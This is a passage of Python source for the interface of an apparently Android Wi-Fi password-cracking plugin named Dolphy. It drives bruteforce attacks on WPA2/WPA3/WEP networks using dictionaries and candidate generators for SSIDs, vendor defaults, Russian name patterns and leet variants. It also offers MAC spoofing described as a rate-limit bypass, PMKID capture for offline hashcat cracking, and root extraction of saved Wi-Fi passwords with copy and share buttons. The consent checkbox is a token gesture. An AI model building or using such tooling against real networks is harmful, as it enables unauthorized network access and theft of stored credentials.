            except Exception as exc:
                self._manual_result = "Error: " + str(exc)[:120]
            finally:
                self._manual_busy = False
                self._refresh(force=True)

        self._launch(job, "io")

    # ═══════════ CANDIDATE ═══════════

    def _toggle_reveal(self):
        self._reveal = not self._reveal

    def _clear_candidate(self):
        self._found_password = ""
        self._reveal = False
        self._copy_flash = 0
        self._finished = False
        try:
            self.set_setting(self.FOUND_KEY, {})
        except Exception:
            pass

    def _copy_candidate(self):
        try:
            if not self._found_password:
                self._toast("No candidate")
                return
            android = self.api.getAndroid()
            ok = android.clipboardSet(self._found_password)
            if ok:
                self._copy_flash = time.time()
                self._toast("Copied")
                self._log("info", "Password copied to clipboard")
            else:
                self._toast("Failed")
        except Exception as exc:
            self._log("error", "clipboard: " + str(exc)[:180])
            self._toast("Copy error")

    def _share_candidate(self):
        try:
            if not self._found_password:
                self._toast("No candidate")
                return
            ssid = self._network.get("ssid", "")
            text = "WiFi: {} | Password: {}".format(ssid, self._found_password)
            android = self.api.getAndroid()
            try:
                android.shareText(text)
                return
            except Exception as e1:
                self._log("warning", "shareText: " + str(e1)[:150])
            try:
                if android.clipboardSet(text):
                    self._toast("Copied to clipboard")
                    return
            except Exception:
                pass
            self._toast("Failed to share")
        except Exception as exc:
            self._log("error", "share: " + str(exc)[:180])

    def _copy_wifi_string(self):
        try:
            if not self._found_password:
                self._toast("No password")
                return
            ssid = self._network.get("ssid", "")
            wifi_str = "WIFI:S:{};T:WPA;P:{};;".format(
                ssid, self._found_password)
            android = self.api.getAndroid()
            if android.clipboardSet(wifi_str):
                self._toast("WiFi string copied")
            else:
                self._toast("Failed")
        except Exception as exc:
            self._log("error", "copy_wifi: " + str(exc)[:180])

    def _import_from_clipboard(self):
        try:
            android = self.api.getAndroid()
            text = android.clipboardGet() or ""
            if not isinstance(text, str):
                text = str(text)
            parts = [p.strip() for p in re.split(r"[\r\n,;]+", text)
                     if p.strip()]
            valid = [p for p in parts if self._valid_password(p)]
            if not valid:
                self._toast("No valid passwords in the clipboard")
                return
            sandbox = ""
            try:
                sandbox = str(android.pluginFilesDir() or "")
            except Exception:
                sandbox = ""
            if not sandbox:
                self._toast("No private folder")
                return
            path = sandbox.rstrip("/") + "/clip_dict.txt"
            joined = "\n".join(valid) + "\n"
            ok = False
            try:
                ok = bool(android.filesWrite(path, joined))
            except Exception:
                ok = False
            if not ok:
                self._toast("Failed to write")
                return
            metadata = {
                "path": path, "name": "clip_dict.txt",
                "count": len(valid), "valid": len(valid),
            }
            if path not in self._dicts and len(self._dicts) >= self.MAX_DICTS:
                self._toast("Limit of 16 reached")
                return
            self._dicts[path] = metadata
            if path not in self._enabled_dicts:
                self._enabled_dicts.append(path)
            self._save()
            self._log("success", "Added {} passwords".format(len(valid)))
            self._toast("Added {}".format(len(valid)))
        except Exception as exc:
            self._log("error", "clipboard_import: " + str(exc)[:200])
            self._toast("Import error")

    # ═══════════ LOGS ═══════════

    def _clear_logs(self):
        with self._log_lock:
            self._logs.clear()

    def _export_logs(self):
        with self._log_lock:
            rows = list(self._logs)
        text = "\n".join(
            "[{}] {}: {}".format(stamp, level.upper(), message)
            for level, stamp, message in rows) + "\n"

        if self._shell_mode in ("shizuku", "root"):
            try:
                destination = "/sdcard/Download/dolphy_logs.txt"
                temporary = "/sdcard/Download/.dolphy_logs_{}.tmp".format(
                    time.time_ns())
                self._shell("mkdir -p " + self._shq("/sdcard/Download"))
                self._shell("printf '%s' '' > " + self._shq(temporary),
                            sensitive=True, hide_command_only=True)
                for offset in range(0, len(text), 3000):
                    if self._stop.is_set():
                        self._log("warning", "Export stopped")
                        return
                    self._shell(
                        "printf '%s' {} >> {}".format(
                            self._shq(text[offset:offset + 3000]),
                            self._shq(temporary)),
                        sensitive=True, hide_command_only=True)
                self._shell("mv -f {} {}".format(self._shq(temporary),
                                                  self._shq(destination)))
                self._log("success", "Log: " + destination)
                self._toast("Log saved to Download")
                return
            except Exception as exc:
                self._log("warning", "export shell: " + str(exc)[:160])

        try:
            android_obj = self.api.getAndroid()
            sandbox = ""
            try:
                sandbox = str(android_obj.pluginFilesDir() or "")
            except Exception:
                sandbox = ""
            if sandbox:
                path = sandbox.rstrip("/") + "/dolphy_logs.txt"
                if bool(android_obj.filesWrite(path, text)):
                    self._log("success", "Log: " + path)
                    self._toast("Log saved to " + path)
                    return
        except Exception as exc:
            self._log("warning", "export fallback: " + str(exc)[:160])

        self._toast("Failed to save")

    # ═══════════ UI ═══════════

    def _button(self, ui, title, callback, *args, enabled=True, style="tonal"):
        return ui.button(title, self._bind(callback, *args),
                         enabled=enabled, style=style)

    def _bottom_nav(self, ui):
        return ui.card([
            ui.text("🧭  NAVIGATION", "labelSmall", color="secondary"),
            ui.button("🏠  Home", self._bind(self._go, "main"),
                      style="filled"),
            ui.row([
                ui.button("📡  Networks", self._bind(self._go, "networks"),
                          style="tonal"),
                ui.button("📚  Dictionaries", self._bind(self._go, "dicts"),
                          style="tonal"),
                ui.button("📈  RSSI", self._bind(self._go, "graph"),
                          style="tonal"),
            ]),
            ui.row([
                ui.button("🔓  Saved", self._bind(self._go, "saved"),
                          style="tonal"),
                ui.button("📋  Logs", self._bind(self._go, "logs"),
                          style="tonal"),
                ui.button("🔳  QR", self._bind(self._go, "qr"),
                          style="tonal"),
            ]),
        ], padding=16)

    def _status_info(self):
        if self._root_available and self._wpa_cli_available:
            return ("🟢", "Root + wpa_cli",
                    "Fast switch · MAC spoof · PMKID · saved Wi-Fi",
                    "ROOT · MAX", "success")
        if self._root_available:
            return ("🟢", "Root active",
                    "Full access · saved Wi-Fi",
                    "ROOT", "success")
        if self._shell_mode == "shizuku":
            return ("🟢", "Shizuku active",
                    "Standard access · cmd wifi",
                    "SHIZUKU · UID " + (self._uid or "?"), "success")
        if self._shell_mode == "root":
            return ("🟢", "Root active", "Full access", "ROOT", "success")
        if self._shell_mode == "none":
            return ("🟡", "View only",
                    "Bruteforce disabled · scanning and RSSI work",
                    "NO SHELL", "warning")
        return ("⚪", "Testing…", "Detecting modes",
                "DETECTING", "secondary")

    def _busy_ui(self, ui):
        if not self._busy or self._page == "main":
            return []
        return [ui.card([
            ui.text("Scanning…" if self._scanning
                    else "Operation in progress", "titleMedium"),
            ui.circular_progress(),
            self._button(ui, "⏹  Stop", self._stop_work, style="tonal"),
        ])]

    def _readiness(self):
        missing = []
        if self._shell_mode == "none":
            missing.append("• Shizuku or root")
        if not self._consent:
            missing.append("• Owner permission")
        sec = self._network.get("security", "")
        if sec not in ("psk", "sae", "wep"):
            missing.append("• WPA2/WPA3/WEP network")
        if not self._network.get("ssid"):
            missing.append("• Selected network")
        if (not self._enabled_dicts and not self._use_ssid_gen
                and not self._use_vendor_gen and not self._use_ru_gen
                and not self._use_morph):
            missing.append("• Dictionary or generator")
        return missing

    def _hero_ui(self, ui):
        emoji, title, sub, badge, badge_color = self._status_info()
        ssid = self._text(self._network.get("ssid")) or ""
        sec = self._network.get("security", "")
        sec_name = self.SECURITY_NAMES.get(sec, "")
        sec_emoji = self.SECURITY_EMOJI.get(sec, "❔")
        vendor = self._vendor_for_bssid(self._network.get("bssid", ""))

        ol = self._outcome.lower()
        if ("interrupt" in ol or "error" in ol or "refused" in ol
                or "unavailable" in ol or "❌" in ol):
            out_color = "error"
        elif ("found" in ol or "in progress" in ol or "connect" in ol
                or "✅" in ol):
            out_color = "success"
        else:
            out_color = "secondary"

        children = [
            ui.text(emoji + "  " + title, "headlineSmall"),
            ui.text(sub, "bodySmall", color="secondary"),
            ui.text("● " + badge, "labelSmall", color=badge_color),
            ui.divider(),
        ]

        if ssid:
            children.append(ui.text("🎯  " + sec_emoji + "  " + ssid,
                                    "titleLarge"))
            line2 = sec_name
            if vendor:
                line2 += "  ·  " + vendor
            children.append(ui.text(line2, "bodySmall", color="secondary"))
        else:
            children.append(ui.text("🎯  No network selected", "titleLarge",
                                    color="secondary"))
            children.append(ui.text("Open \"Networks\" and pick WPA2/WPA3/WEP",
                                    "bodySmall", color="muted"))

        if self._use_adaptive_settle:
            children.append(ui.text(
                "⏱  settle: {:.1f} s (adaptive)".format(
                    self._effective_settle()),
                "bodySmall", color="secondary"))
        else:
            children.append(ui.text(
                "⏱  settle: {:.1f} s".format(self._settle),
                "bodySmall", color="secondary"))

        if self._wpa_cli_available:
            children.append(ui.text(
                "⚡  fast switch: reattach active",
                "bodySmall", color="success"))
        if self._hashcat_path:
            children.append(ui.text(
                "🚀  hashcat: found",
                "bodySmall", color="success"))
        if self._pmkid_hex:
            children.append(ui.text(
                "🎯  PMKID: ready for cracking",
                "bodySmall", color="success"))

        children.append(ui.text("Status: " + self._outcome, "bodyMedium",
                                color=out_color))

        if self._scanning:
            children.append(ui.text("⏳  Scanning…", "bodySmall",
                                    color="primary"))

        return ui.card(children)

    def _progress_ui(self, ui):
        if not (self._total or self._running or self._finished):
            return None
        fraction = min(1.0, self._checked / max(self._total, 1))
        pct = fraction * 100.0
        return ui.card([
            ui.text("⚡  PROGRESS", "labelSmall", color="secondary"),
            ui.linear_progress(progress=float(fraction)),
            ui.text("{:.1f}%  ·  {} / {}".format(
                pct, self._checked, self._total), "titleMedium"),
            ui.text("{:.2f} p/s  ·  ~{}".format(
                self._speed, self._format_eta(self._eta)),
                "bodySmall", color="secondary"),
        ])

    def _recent_ui(self, ui):
        with self._recent_lock:
            rows = list(self._recent)[-5:]
        if not rows:
            return None
        lines = [ui.text("🕒  LATEST ATTEMPTS", "labelSmall",
                         color="secondary")]
        for idx, last4, ok, ms in reversed(rows):
            mark = "✅" if ok else "✖"
            color = "success" if ok else "secondary"
            lines.append(ui.text(
                "{}  #{}  {}  ·  {} ms".format(mark, idx, last4, ms),
                "labelSmall", color=color))
        return ui.card(lines)

    def _candidate_ui(self, ui):
        if not self._found_password:
            return None
        flash = (time.time() - self._copy_flash) < 3
        shown = self._found_password if self._reveal else "••••••••••••"
        return ui.card([
            ui.text("🎯  FOUND PASSWORD", "labelSmall", color="success"),
            ui.text("Network: " + self._text(self._network.get("ssid", "")),
                    "bodyMedium"),
            ui.text("Verify manually before relying on it",
                    "bodySmall", color="warning"),
            ui.text(shown, "headlineMedium",
                    color="success" if self._reveal else "secondary"),
            ui.row([
                self._button(ui, "👁 Hide" if self._reveal
                             else "👁 Show", self._toggle_reveal,
                             style="tonal"),
                self._button(ui, "✅ Copied" if flash
                             else "📋 Copy", self._copy_candidate,
                             enabled=not self._busy, style="filled"),
            ]),
            ui.row([
                self._button(ui, "📤 Share", self._share_candidate,
                             enabled=not self._busy),
                self._button(ui, "🔳 QR code", self._go, "qr",
                             enabled=not self._busy),
            ]),
            ui.button("🗑 Clear", self._bind(self._clear_candidate),
                      enabled=not self._busy, style="text"),
        ])

    def _resume_ui(self, ui):
        if not self._resume_enabled:
            return None
        summary = self._checkpoint_summary()
        if not summary:
            return None
        return ui.card([
            ui.text("💾  CHECKPOINT", "labelSmall", color="primary"),
            ui.text(summary, "bodySmall", color="secondary"),
            ui.text("Resume or reset?",
                    "bodySmall", color="muted"),
            ui.row([
                self._button(ui, "▶️  Resume", self._start_audit,
                             enabled=not self._busy, style="filled"),
                self._button(ui, "🗑  Reset", self._clear_checkpoint,
                             enabled=not self._busy),
            ]),
        ])

    def _pmkid_ui(self, ui):
        available = not self._busy
        ssid = self._text(self._network.get("ssid")) or "—"

        children = [ui.card([
            ui.text("🎯  PMKID + HASHCAT", "labelSmall",
                    color="secondary"),
            ui.text("Offline cracking of the captured hash",
                    "bodySmall", color="secondary"),
            ui.divider(),
            ui.text("Network: " + ssid, "bodyMedium"),
        ])]

        if not self._root_available:
            children.append(ui.card([
                ui.text("⚠️  Root required", "titleMedium",
                        color="warning"),
                ui.text("PMKID and hashcat only work with root",
                        "bodySmall", color="muted"),
            ]))
        else:
            status_children = [
                ui.text("PMKID status", "labelSmall", color="secondary"),
            ]
            if self._pmkid_hex:
                status_children.append(ui.text(
                    "✅ Captured · " + self._pmkid_hash[:16] + "…",
                    "bodyMedium", color="success"))
            else:
                status_children.append(ui.text(
                    "❌ Not captured", "bodyMedium", color="warning"))
            status_children.append(self._button(
                ui, "📡  Capture PMKID", self._capture_pmkid,
                enabled=available and self._wpa_cli_available,
                style="filled"))
            children.append(ui.card(status_children))

            hc_children = [
                ui.text("hashcat", "labelSmall", color="secondary"),
            ]
            if self._hashcat_path:
                hc_children.append(ui.text(
                    "✅ " + self._hashcat_path, "bodySmall", color="success"))
            else:
                hc_children.append(ui.text(
                    "❌ Not found. Install to: /data/local/tmp/hashcat/",
                    "bodySmall", color="warning"))
            hc_children.append(ui.text(
                "Dictionary: " + (
                    os.path.basename(self._enabled_dicts[0])
                    if self._enabled_dicts else "none"),
                "bodySmall", color="secondary"))
            hc_children.append(self._button(
                ui, "🚀  Offline cracking", self._crack_with_hashcat,
                enabled=(available and bool(self._pmkid_hex)
                         and bool(self._hashcat_path)
                         and bool(self._enabled_dicts)),
                style="filled"))
            children.append(ui.card(hc_children))

            children.append(ui.card([
                ui.text("ℹ️  HOW IT WORKS", "labelSmall",
                        color="secondary"),
                ui.text(
                    "1. Connect to the network first (cmd wifi connect-network)\n"
                    "2. Tap \"Capture PMKID\" — it is taken from the PMKSA cache\n"
                    "3. Tap \"Offline cracking\" — hashcat checks the dictionary",
                    "bodySmall", color="muted"),
            ]))

        children.append(self._bottom_nav(ui))
        return children

    def _main_ui(self, ui):
        available = not self._busy

        children = [self._hero_ui(ui)]

        candidate = self._candidate_ui(ui)
        if candidate is not None:
            children.append(candidate)

        resume = self._resume_ui(ui)
        if resume is not None:
            children.append(resume)

        progress = self._progress_ui(ui)
        if progress is not None:
            children.append(progress)

        recent = self._recent_ui(ui)
        if recent is not None:
            children.append(recent)

        missing = self._readiness()
        start_style = "filled" if not missing else "tonal"

        audit_children = [
            ui.text("🔐  NETWORK TEST", "labelSmall", color="secondary"),
            ui.checkbox(checked=self._consent,
                        on_change=self._value(self._set_consent, refresh=True),
                        title="Network owner permission granted",
                        subtitle="Testing changes the Wi-Fi connection",
                        enabled=available),
            ui.slider(value=self._settle,
                      on_change=self._value(self._set_settle, refresh=True),
                      minimum=int(self.MIN_SETTLE),
                      maximum=int(self.MAX_SETTLE),
                      steps=int(self.MAX_SETTLE - self.MIN_SETTLE),
                      title="⏱  settle: {:.1f} s".format(self._settle)),
            ui.checkbox(checked=self._use_adaptive_settle,
                        on_change=self._value(self._toggle_adaptive,
                                              refresh=True),
                        title="Adaptive settle",
                        subtitle="Auto-adjust the pause",
                        enabled=available),
            ui.checkbox(checked=self._use_ssid_gen,
                        on_change=self._value(self._toggle_ssid_gen,
                                              refresh=True),
                        title="Generator from SSID",
                        subtitle="Candidates from the name",
                        enabled=available),
            ui.checkbox(checked=self._use_vendor_gen,
                        on_change=self._value(self._toggle_vendor_gen,
                                              refresh=True),
                        title="Vendor defaults",
                        subtitle="CIS and worldwide",
                        enabled=available),
            ui.checkbox(checked=self._use_ru_gen,
                        on_change=self._value(self._toggle_ru_gen,
                                              refresh=True),
                        title="Russian patterns",
                        subtitle="Names, translit, years",
                        enabled=available),
            ui.checkbox(checked=self._use_morph,
                        on_change=self._value(self._toggle_morph,
                                              refresh=True),
                        title="Morphing (leet)",
                        subtitle="a→4, e→3, o→0",
                        enabled=available),
            ui.checkbox(checked=self._resume_enabled,
                        on_change=self._value(self._toggle_resume,
                                              refresh=True),
                        title="Save progress",
                        enabled=available),
            ui.checkbox(checked=self._notify_on_found,
                        on_change=self._value(self._toggle_notify,
                                              refresh=True),
                        title="Notify when found",
                        enabled=available),
        ]

        if self._root_available:
            audit_children.extend([
                ui.checkbox(checked=self._use_mac_spoof,
                            on_change=self._value(self._toggle_mac_spoof,
                                                  refresh=True),
                            title="MAC spoofing",
                            subtitle="Rate-limit bypass",
                            enabled=available),
                ui.slider(value=self._spoof_every,
                          on_change=self._value(self._set_spoof_every,
                                                refresh=True),
                          minimum=5, maximum=50, steps=9,
                          title="MAC every {} attempts".format(
                              self._spoof_every)),
            ])

        audit_children.append(ui.text(
            "Pause: {:.2f} s. Minimum settle: {} s.".format(
                self.INTER_ATTEMPT_DELAY, int(self.MIN_SETTLE)),
            "bodySmall", color="secondary"))

        if missing:
            audit_children.append(ui.text(
                "Missing:\n" + "\n".join(missing),
                "bodySmall", color="warning"))

        if self._shell_mode == "none":
            audit_children.append(ui.row([
                self._button(ui, "❓ How to enable bruteforce", self._toggle_help,
                             style="filled"),
                self._button(ui, "🔧 Diagnostics", self._launch,
                             self._diagnose, enabled=available),
            ]))
        else:
            audit_children.append(ui.row([
                self._button(ui, "▶️  Start", self._start_audit,
                             enabled=available, style=start_style),
                self._button(ui, "⏹  Stop", self._stop_work,
                             enabled=self._busy, style="text"),
            ]))
            audit_children.append(ui.row([
                self._button(ui, "🔧  Diagnostics", self._launch,
                             self._diagnose, enabled=available),
                self._button(ui, "📡  To networks", self._go, "networks",
                             enabled=available),
            ]))
            if self._root_available:
                audit_children.append(self._button(
                    ui, "🎯  PMKID / hashcat", self._go, "pmkid",
                    enabled=available, style="tonal"))

        children.append(ui.card(audit_children))

        manual_children = [
            ui.text("🧪  SINGLE PASSWORD TEST", "labelSmall",
                    color="secondary"),
            ui.text_field(value=self._manual_password,
                          on_change=self._value(self._set_manual),
                          label="Password"),
            ui.row([
                self._button(ui, "▶️  Test", self._test_single_password,
                             enabled=(available and not self._manual_busy
                                      and self._shell_mode != "none"),
                             style="filled"),
            ]),
        ]
        if self._manual_result:
            color = ("success" if "✅" in self._manual_result
                     else "error" if "❌" in self._manual_result
                     or "Error" in self._manual_result
                     else "warning")
            manual_children.append(ui.text(
                self._manual_result, "bodyMedium", color=color))
        children.append(ui.card(manual_children))

        if self._show_help:
            children.append(ui.alert_dialog(
                show=True,
                title="How to enable bruteforce",
                message=(
                    "Without root and Shizuku only viewing is available: "
                    "scanning, RSSI, dictionaries.\n\n"
                    "• Shizuku: install the Shizuku app, "
                    "start the service (via ADB, Wi-Fi ADB, "
                    "or split-screen), then grant Dolphy permission.\n\n"
                    "• Root: flash Magisk or KernelSU. "
                    "With root the wpa_cli fast switch works, "
                    "plus MAC spoofing, PMKID and saved Wi-Fi."),
                confirm_text="Got it",
                on_confirm=self._bind(self._toggle_help),
                on_dismiss=self._bind(self._toggle_help),
                cancelable=True,
            ))

        children.append(self._bottom_nav(ui))
        return children

    def _networks_ui(self, ui):
        available = not self._busy
        networks = list(self._networks)
        source = self._scan_source or (
            "shell" if self._shell_mode in ("shizuku", "root") else "api")

        children = [ui.card([
            ui.text("📡  NETWORKS NEARBY", "labelSmall", color="secondary"),
            ui.text("Source: " + source, "bodySmall", color="secondary"),
            ui.text("Last: " + (self._scan_time or "never yet"),
                    "bodySmall", color="secondary"),
            self._button(ui,
                         "⏳ Scanning…" if self._scanning
                         else "🔍  Scan",
                         self._begin_scan, enabled=available,
                         style="filled"),
        ])]

        children.append(ui.text_field(
            value=self._network_filter,
            on_change=self._value(self._set_filter, refresh=True),
            label="🔎  Filter by SSID or BSSID"))

        query = self._network_filter.strip().casefold()
        visible = [item for item in networks
                   if not query
                   or query in item["ssid"].casefold()
                   or query in item["bssid"].casefold()]

        if networks:
            children.append(ui.text("Shown: {} / {}".format(
                len(visible), len(networks)), "bodySmall", color="secondary"))

        if not visible:
            if query and networks:
                msg = "🔍  Nothing matches the filter"
            elif self._scanning:
                msg = "⏳  Scanning…"
            elif self._scan_attempted:
                msg = "⚠️  No results"
            else:
                msg = "📡  Press \"Scan\""
            children.append(ui.card([ui.text(msg, "bodyMedium",
                                             color="secondary")]))

        selected_bssid = self._network.get("bssid")
        for network in visible:
            selected = (bool(selected_bssid)
                        and network["bssid"] == selected_bssid)
            hidden = not network["ssid"]
            name = network["ssid"] or "🔒 Hidden"
            sec = network["security"]
            sec_icon = self.SECURITY_EMOJI.get(sec, "❔")
            sec_name = self.SECURITY_NAMES.get(sec, "—")
            sec_color = ("success" if sec in ("psk", "sae")
                         else "warning" if sec in ("eap", "wep")
                         else "secondary")
            vendor = self._vendor_for_bssid(network.get("bssid", ""))

            head = sec_icon + "  " + ("✓ " if selected else "") + name
            card_children = [
                ui.text(head, "titleMedium",
                        color="primary" if selected else None),
                ui.text("{}  ·  {}  ·  {} dBm".format(
                    sec_name, self._band(network["frequency"]),
                    network["rssi"]),
                    "bodySmall", color=sec_color),
            ]
            if vendor:
                card_children.append(ui.text(
                    "🏭  " + vendor, "labelSmall", color="muted"))
            card_children.append(ui.text(self._signal(network["rssi"]),
                                         "bodySmall", color="secondary"))
            card_children.append(ui.text(network["bssid"], "labelSmall",
                                         color="muted"))

            if hidden:
                card_children.append(ui.text(
                    "⚠️  No SSID — cannot select",
                    "bodySmall", color="warning"))

            card_children.append(self._button(
                ui,
                "✓  Selected" if selected else "✅  Select",
                self._select_network, dict(network),
                enabled=available and not hidden,
                style="filled" if selected else "tonal"))

            children.append(ui.card(card_children))

        children.append(ui.button(
            "🔼  Hide reply" if self._show_raw else "📄  Reply",
            self._bind(self._toggle_raw), style="text"))

        if self._show_raw:
            children.append(ui.card([
                ui.text("Unparsed: {}".format(
                    self._scan_unparsed), "bodySmall", color="secondary"),
                ui.text((self._scan_raw or "(empty)")[:3000],
                        "labelSmall", color="secondary"),
            ]))

        children.append(self._bottom_nav(ui))
        return children

    def _dicts_ui(self, ui):
        available = not self._busy

        children = [ui.card([
            ui.text("📚  DICTIONARIES", "labelSmall", color="secondary"),
            ui.text("UTF-8 · up to 10 MB · up to 16 · up to {:,} passwords".format(
                self.MAX_PASSWORDS).replace(",", " "),
                "bodySmall", color="secondary"),
            ui.row([
                self._button(ui, "📂  File", self._open_browser,
                             enabled=available, style="filled"),
                self._button(ui, "🔍  Find .txt", self._go, "search",
                             enabled=available),
            ]),
            self._button(ui, "📋  Import from clipboard",
                         self._import_from_clipboard,
                         enabled=available, style="tonal"),
        ])]

        if not self._dicts:
            children.append(ui.card([
                ui.text("📭  No dictionaries", "titleMedium"),
                ui.text("Open Download or find a .txt",
                        "bodySmall", color="secondary"),
            ]))

        for path, item in list(self._dicts.items()):
            count = item.get("count")
            valid = item.get("valid")
            enabled = path in self._enabled_dicts
            mark = "✅" if enabled else "⭕"
            detail = ("Will be re-read" if valid is None
                      else "Lines: {} · valid: {}".format(count, valid))

            children.append(ui.card([
                ui.text(mark + "  " + item["name"], "titleMedium"),
                ui.text(detail, "bodySmall", color="secondary"),
                ui.text(path, "labelSmall", color="muted"),
                ui.row([
                    self._button(ui,
                                 "🚫  Disable" if enabled else "✅  Enable",
                                 lambda p=path, e=enabled:
                                 self._enable_dictionary(p, not e),
                                 enabled=available,
                                 style="tonal" if enabled else "filled"),
                    self._button(ui, "🗑  Remove", self._delete_dictionary,
                                 path, enabled=available, style="text"),
                ]),
            ]))

        children.append(self._bottom_nav(ui))
        return children

    def _browser_ui(self, ui):
        available = not self._busy
        parent = ("/sdcard" if self._folder == "/sdcard"
                  else os.path.dirname(self._folder))

        children = [
            ui.button("←  Back to dictionaries", self._bind(self._go, "dicts"),
                      style="filled"),
            ui.card([
                ui.text("📂  FILES", "labelSmall", color="secondary"),
                ui.text(self._folder, "bodyMedium", color="primary"),
                ui.row([
                    self._button(ui, "⬆  Up", self._open_browser, parent,
                                 enabled=available),
                    self._button(ui, "🔍  Search", self._go, "search",
                                 enabled=available),
                ]),
                ui.row([
                    self._button(ui, "📥 Download", self._open_browser,
                                 "/sdcard/Download", enabled=available,
                                 style="text"),
                    self._button(ui, "📄 Documents", self._open_browser,
                                 "/sdcard/Documents", enabled=available,
                                 style="text"),
                ]),
            ]),
        ]

        visible = 0
        for entry in list(self._files):
            path = entry["path"]
            is_folder = entry["folder"]
            if not is_folder and not entry["name"].lower().endswith(".txt"):
                continue
            visible += 1

            if is_folder:
                cb = self._bind(self._open_browser, path)
                label = "📂  Open"
                emoji = "📁"
            else:
                cb = self._bind(self._launch,
                                lambda p=path: self._import_dictionary(p))
                label = "➕  Add"
                emoji = "📄"

            children.append(ui.card([
                ui.text(emoji + "  " + entry["name"], "titleMedium"),
                ui.button(label, cb, enabled=available, style="tonal"),
            ]))

        if visible == 0:
            children.append(ui.card([
                ui.text("📭  No .txt files in the folder",
                        "bodyMedium", color="secondary"),
            ]))

        children.append(self._bottom_nav(ui))
        return children

    def _search_ui(self, ui):
        available = not self._busy
        children = [
            ui.button("←  Back to dictionaries", self._bind(self._go, "dicts"),
                      style="filled"),
            ui.card([
                ui.text("🔍  .TXT SEARCH", "labelSmall", color="secondary"),
                ui.text_field(value=self._query,
                              on_change=self._value(self._set_query, refresh=True),
                              label="Part of the file name"),
                ui.slider(value=self._depth,
                          on_change=self._value(self._set_depth, refresh=True),
                          minimum=2, maximum=6, steps=3,
                          title="Depth: {}".format(self._depth)),
                ui.row([
                    self._button(ui, "🔍  Search", self._launch,
                                 lambda: self._search_files(False),
                                 enabled=available, style="filled"),
                    self._button(ui, "📄  All .txt", self._launch,
                                 lambda: self._search_files(True),
                                 enabled=available),
                ]),
            ]),
        ]

        if self._results:
            children.append(ui.text("Found: {}".format(len(self._results)),
                                    "titleMedium", color="success"))
            for path in list(self._results):
                children.append(ui.card([
                    ui.text("📄  " + os.path.basename(path), "titleMedium"),
                    ui.text(path, "labelSmall", color="muted"),
                    self._button(ui, "➕  Add", self._launch,
                                 lambda p=path: self._import_dictionary(p),
                                 enabled=available, style="filled"),
                ]))
        else:
            children.append(ui.card([
                ui.text("Nothing found", "bodyMedium",
                        color="secondary"),
            ]))

        children.append(self._bottom_nav(ui))
        return children

    def _saved_ui(self, ui):
        available = not self._busy
        children = [
            ui.button("←  Home", self._bind(self._go, "main"),
                      style="filled"),
            ui.card([
                ui.text("🔓  SAVED WI-FI", "labelSmall",
                        color="secondary"),
                ui.text("Reads WifiConfigStore.xml (root)",
                        "bodySmall", color="secondary"),
                self._button(ui, "🔄  Refresh",
                             self._refresh_saved_wifi,
                             enabled=available, style="filled"),
            ]),
        ]

        with self._saved_wifi_lock:
            items = list(self._saved_wifi)

        if not self._root_available:
            children.append(ui.card([
                ui.text("⚠️  Root required", "titleMedium",
                        color="warning"),
            ]))
        elif not items:
            children.append(ui.card([
                ui.text("📭  Nothing read", "bodyMedium",
                        color="secondary"),
                ui.text("Press \"Refresh\"", "bodySmall", color="muted"),
            ]))
        else:
            children.append(ui.text("Found: {}".format(len(items)),
                                    "titleMedium", color="success"))
            for item in items[:50]:
                ssid = item.get("ssid", "")
                psk = item.get("psk", "")
                show = ssid in self._show_saved_psk
                shown = psk if show else "••••••••"
                
                children.append(ui.card([
                    ui.text("🔓  " + ssid, "titleMedium"),
                    ui.text("PSK: " + shown, "bodySmall",
                            color="success" if show else "secondary"),
                    ui.text("BSSID: " + (item.get("bssid") or "—"),
                            "labelSmall", color="muted"),
                    ui.row([
                        self._button(ui, "👁 Hide" if show else "👁 Show",
                                     lambda s=ssid: self._toggle_saved_psk(s),
                                     style="tonal"),
                        self._button(ui, "📋  Copy",
                                     self._bind(self._copy_saved_psk, psk),
                                     enabled=available, style="tonal"),
                    ]),
                    ui.button("🎯  Select this network",
                              self._bind(self._use_saved_as_target, item),
                              enabled=available, style="filled"),
                ]))

        children.append(self._bottom_nav(ui))
        return children

    def _copy_saved_psk(self, psk):
        try:
            android = self.api.getAndroid()
            if android.clipboardSet(psk):
                self._toast("PSK copied")
            else:
                self._toast("Failed")
        except Exception as exc:
            self._log("error", "copy saved: " + str(exc)[:150])

    def _use_saved_as_target(self, item):
        try:
            ssid = item.get("ssid", "")
            bssid = item.get("bssid", "")
            if not ssid:
                self._toast("No SSID")
                return
            self._network = {
                "ssid": ssid, "bssid": bssid or "",
                "frequency": 2437, "rssi": -50,
                "age": "0", "flags": "", "security": "psk",
            }
            self._target_sec = "wpa2"
            self._found_password = item.get("psk", "")
            self._reveal = False
            self._page = "main"
            self._outcome = "Network: " + ssid
            self._save()
            self._toast("Target: " + ssid)
        except Exception as exc:
            self._log("error", "use saved: " + str(exc)[:150])

    def _graph_ui(self, ui):
        try:
            with self._rssi_lock:
                samples = list(self._rssi_samples)
        except Exception:
            samples = []

        ssid = self._text(self._network.get("ssid")) or "No network selected"

        if not samples:
            html = (
                '<!doctype html><html><head><meta charset="utf-8">'
                '<meta name="viewport" content="width=device-width,'
                'initial-scale=1,user-scalable=no">'
                '<style>'
                'html,body{width:100%;background:#14101c;color:#a89bc4;'
                'font-family:sans-serif;margin:0;padding:40px 20px;'
                'text-align:center}'
                '</style></head><body>'
                '<div style="font-size:40px">📈</div>'
                '<div style="margin-top:20px;font-size:15px">'
                'No RSSI data</div>'
                '<div style="margin-top:8px;font-size:12px;color:#7a6d99">'
                'Select a network — sampling every 2 s</div>'
                '</body></html>'
            )
        else:
            try:
                first_ts = samples[0][0]
                points = [((t - first_ts), r) for t, r in samples]
                points_json = json.dumps(points)
            except Exception:
                points_json = "[]"

            try:
                rssi_values = [r for _, r in samples]
                rssi_min = min(rssi_values)
                rssi_max = max(rssi_values)
                rssi_avg = sum(rssi_values) / len(rssi_values)
            except Exception:
                rssi_min, rssi_max, rssi_avg = -100, -30, -70

            html = (
                '<!doctype html><html><head><meta charset="utf-8">'
                '<meta name="viewport" content="width=device-width,'
                'initial-scale=1,user-scalable=no">'
                '<style>'
                'html,body{width:100%;height:100%;background:#14101c;'
                'color:#e8dcff;font-family:sans-serif;margin:0;'
                'overflow:hidden}'
                'canvas{display:block;width:100%;height:100%}'
                '.legend{position:absolute;top:12px;left:12px;'
                'background:rgba(30,26,42,0.85);border-radius:12px;'
                'padding:10px 14px;font-size:12px;line-height:1.6}'
                '.legend .row{color:#a89bc4}'
                '.legend b{color:#e8dcff}'
                '</style></head><body>'
                '<canvas id="c"></canvas>'
                '<div class="legend">'
                '<div class="row">min <b>' + str(rssi_min) + ' dBm</b></div>'
